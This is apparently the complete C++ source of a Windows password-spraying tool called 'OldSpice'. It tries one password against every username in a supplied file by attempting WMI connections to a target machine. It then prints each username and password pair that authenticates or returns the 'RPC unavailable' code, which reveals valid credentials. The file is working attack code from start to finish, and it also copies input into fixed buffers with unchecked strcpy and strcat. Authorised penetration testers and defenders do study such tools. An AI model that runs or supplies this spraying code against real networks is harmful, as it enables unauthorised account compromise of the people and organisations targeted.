#include <iostream>
#include <comdef.h>
#include <Wbemidl.h>
#include <fstream>
#include <string>
#pragma comment(lib, "wbemuuid.lib")
#pragma warning(disable:4996)

using namespace std;

int main(int argc, char* argv[])
{

	if (argc < 5) {
		printf("[+] Usage: .\\OldSpice.exe <ip> <username_file> <password> <domain>\n\n");
		return -1;
	}

	char* target = argv[1];

	char* password = argv[3];

	char remoteep[100] = "\\\\";
	strcat(remoteep, target);
	strcat(remoteep, "\\root\\cimv2");

	HRESULT hr;

	hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);

	if (FAILED(hr)) {
		printf("[-] Failed to initialize COM lib: %d\n", GetLastError());
		return -1;
	}

	printf("[+] COM Library Initialized!\n");

	printf("[!] Setting COM Security level...\n");
	hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IDENTIFY, NULL, EOAC_NONE, NULL);
	if (FAILED(hr)) {
		printf("[-] CoInitializeSecurity failed: %d\n", GetLastError());
		CoUninitialize();
		return -1;
	}

	IWbemLocator* pLoc = NULL;

	hr = CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
	if (FAILED(hr)) {
		printf("[-] Failed to create IWbem instance: %d\n", GetLastError());
		CoUninitialize();
		return -1;
	}

	IWbemServices* pSvc = NULL;
  
	printf("[+] Connecting to target...\n");
	
	int linesNumber = 0;
	string line;

	ifstream in(argv[2]);
	if (in) {
		int errorCount = 1;

		printf("[+] Starting spray.\n\n");

		while(getline(in, line)){
			char username[100];
			strcpy(username, argv[4]);
			strcat(username, "\\");
			strcat(username, line.c_str());

			printf("[!] Trying: %s with password %s\n", username, password);


			hr = pLoc->ConnectServer(_bstr_t(remoteep), _bstr_t(username), _bstr_t(password),
				NULL, NULL,
				NULL,
				NULL, &pSvc
			);

			if (FAILED(hr)) {
				if ((unsigned int)hr != 2147944122) {
					cout << "[-] Error connecting."
						<< " Error code = "
						<< (unsigned int)hr << endl;
					continue;
				}
				else {
					printf("\n--------\n[+] VALID CREDS: %s - %s RPC Server is unavailable tho!\n--------\n\n", username, password);
					continue;
				}
			}

			else {
				printf("\n--------\n[+] Connection success using creds: %s - %s\n--------\n\n", username, password);
				continue;
			}


		}

		in.close();
	}
	pLoc->Release();
	CoUninitialize();


	printf("[+] Done.\n");

}
